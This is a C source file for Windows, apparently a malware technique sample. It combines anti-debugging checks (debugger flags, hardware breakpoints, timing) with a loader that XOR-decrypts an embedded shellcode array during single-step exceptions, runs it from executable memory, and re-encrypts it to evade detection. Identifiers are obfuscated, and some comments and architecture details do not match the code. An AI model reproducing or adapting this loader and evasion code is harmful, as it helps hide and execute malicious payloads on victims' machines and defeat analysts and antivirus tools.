#include <windows.h>
#include <winnt.h>

// Advanced Anti-Debug Techniques
bool asm_func_1320() {
    // TLS Callback anti-debug
    if (IsDebuggerPresent()) return false;
    
    // PEB check
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return false;
    
    // Hardware breakpoint detection
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return false;
    }
    
    // Timing check
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD end = GetTickCount();
    if ((end - start) > 200) return false;  // Debugger detected
    
    return true;
}


// Single-Step XOR Decryption Stub
// Decrypts and re-encrypts on the fly to evade detection
#include <windows.h>

static unsigned char var_6323[] = {
    0xc8, 0x03, 0x6c, 0xa8, 0xc8, 0x03, 0x64, 0x70, 0xc8, 0x0d, 0x95, 0xe6, 0x80, 0x80, 0x80, 0xc8,
    0x0d, 0x8d, 0xd2, 0x80, 0x80, 0x80, 0x68, 0x1e, 0x80, 0x80, 0x80, 0xcc, 0x0b, 0x78, 0xc8, 0x0d,
    0x8d, 0xdd, 0x80, 0x80, 0x80, 0x7f, 0x50, 0xc8, 0x03, 0x44, 0xa8, 0x43
};
static const unsigned char var_2675 = 0x80;

LONG WINAPI asm_func_9192(PEXCEPTION_POINTERS ExceptionInfo) {
    static int step_count = 0;
    static bool decrypted = false;
    
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        step_count++;
        
        // Decrypt one byte at a time during execution
        if (!decrypted && step_count <= sizeof(var_6323)) {
            var_6323[step_count - 1] ^= var_2675;
        }
        
        // After a few steps, execute the payload
        if (step_count == sizeof(var_6323) + 5) {
            decrypted = true;
            LPVOID exec_mem = VirtualAlloc(NULL, sizeof(var_6323), 
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (exec_mem) {
                memcpy(exec_mem, var_6323, sizeof(var_6323));
                ((void(*)())exec_mem)();
                VirtualFree(exec_mem, 0, MEM_RELEASE);
            }
            
            // Re-encrypt for stealth
            for (size_t i = 0; i < sizeof(var_6323); i++) {
                var_6323[i] ^= var_2675;
            }
            
            // Disable single-stepping
            ExceptionInfo->ContextRecord->EFlags &= ~0x100;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        
        // Continue single-stepping
        ExceptionInfo->ContextRecord->EFlags |= 0x100;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void asm_func_7644() {
    SetUnhandledExceptionFilter(asm_func_9192);
    
    // Enable single-step mode
    __asm {
        pushfd
        or dword ptr [esp], 0x100  // Set trap flag
        popfd
    }
    
    // Dummy operations to trigger single-step
    volatile int dummy = 0;
    for (int i = 0; i < 20; i++) {
        dummy += i;
    }
}

